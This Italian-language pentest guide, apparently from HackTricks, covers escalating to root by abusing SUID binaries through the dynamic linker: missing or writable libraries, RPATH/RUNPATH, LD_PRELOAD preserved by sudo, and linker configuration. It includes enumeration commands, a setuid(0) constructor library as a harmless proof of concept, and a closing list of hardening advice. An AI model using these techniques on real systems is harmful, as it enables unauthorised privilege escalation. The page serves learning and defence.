# Abuso di Shared Library e Linker SUID

{{#include ../../banners/hacktricks-training.md}}

I binari SUID vengono solitamente analizzati per individuare l'esecuzione diretta di comandi, ma i programmi SUID personalizzati possono essere vulnerabili anche attraverso il linker dinamico. Il tema comune è semplice: un eseguibile privilegiato carica codice da un path o da una configurazione che un utente con privilegi inferiori può influenzare.

Questa pagina si concentra sui pattern generici delle tecniche: librerie mancanti, directory delle librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione relativa agli hardlink SUID.

## Enumerazione rapida

Inizia individuando i file SUID insoliti e verificando se sono collegati dinamicamente:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrati su posizioni non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma al di fuori delle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.

Controlli utili della scrivibilità:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Alcuni binari SUID personalizzati tentano di caricare un shared object che non esiste. Se il percorso mancante si trova in una directory controllata dall'attaccante, il binario potrebbe caricare codice fornito dall'attaccante con i privilegi dell'utente effettivo.

Individua le ricerche di librerie non riuscite:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se il binario cerca `libexample.so` in un percorso scrivibile, una libreria di dimostrazione minimale può utilizzare un constructor. Mantieni innocua la dimostrazione dell'impatto durante la validazione:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compilalo con il nome file esatto che il binario tenta di caricare:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condizione sfruttabile non è la sola libreria mancante. L’attacker deve poter posizionare un shared object compatibile in un percorso che il loader privilegiato accetterà.

## Directory della libreria scrivibile

A volte tutte le dipendenze sono presenti, ma una delle directory utilizzate per risolverle è scrivibile. Questo può consentire di sostituire una libreria caricata o di inserire una libreria con priorità maggiore avente lo stesso nome.

Esamina i percorsi delle dipendenze:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se la directory è scrivibile, esegui la convalida con un approccio sicuro per la copia in un lab. Sostituire le librerie di sistema su un host attivo può compromettere l'autenticazione, la gestione dei pacchetti o i servizi critici per l'avvio.

## RPATH e RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attaccante.

Rilevale:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Esempio di output rischioso:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l'attaccante potrebbe essere in grado di inserirvi un `libcustom.so` malevolo:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` non sono identici in tutti i dettagli della risoluzione, ma per la valutazione della privilege-escalation la domanda pratica è la stessa: il binario SUID cerca il nome di una library in una directory scrivibile dall'attacker?

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli shared object. Per i programmi SUID, il dynamic loader normalmente entra in secure-execution mode e ignora le variabili d'ambiente pericolose.

Questo significa che un semplice binario SUID di solito non è vulnerabile solo perché l'utente può impostare `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L'eccezione più comune è una misconfiguration di sudo. Se `sudo -l` mostra che una variabile come `LD_PRELOAD` o `LD_LIBRARY_PATH` viene preservata, un comando consentito da sudo può caricare codice controllato dall'attaccante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Non confondere questi casi:

- `LD_PRELOAD` contro un normale binario SUID: generalmente bloccato dalla secure execution.
- `LD_PRELOAD` mantenuto da sudo: potenzialmente sfruttabile.
- `.so` mancante in un path scrivibile: sfruttabile quando il binario SUID carica naturalmente quel path.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: impatto system-wide e elevato.

## Configurazione del Linker

Il dynamic linker legge anche la configurazione di sistema, come `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, la linker cache e, in alcuni casi, `/etc/ld.so.preload`.

Controlli ad alto valore:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
La configurazione del linker scrivibile è solitamente più grave di un singolo binario SUID vulnerabile, perché può influire su molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare l'inserimento di un shared object nei processi privilegiati.

## Confusione degli hardlink SUID

Gli hardlink possono fare in modo che lo stesso inode SUID appaia con più nomi. Questo è utile per nascondere un helper privilegiato, confondere le operazioni di cleanup o aggirare una revisione ingenua basata sui percorsi.

Trova i file SUID con più di un link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispeziona tutti i percorsi che puntano allo stesso inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L'abuso non consiste nel fatto che un hardlink modifichi i permessi. L'abuso consiste nella confusione del percorso: un inode privilegiato può essere raggiungibile tramite un nome che i difensori o gli script non si aspettano. Per un approfondimento sul workflow di inode e hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID minimali, sottoposti ad audit e, ove possibile, gestiti tramite pacchetti.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.
- Non conservare `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader tramite sudo.
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID imprevisti.
- Esamina i file SUID collegati tramite hardlink e analizza i wrapper SUID personalizzati al di fuori dei percorsi di sistema standard.
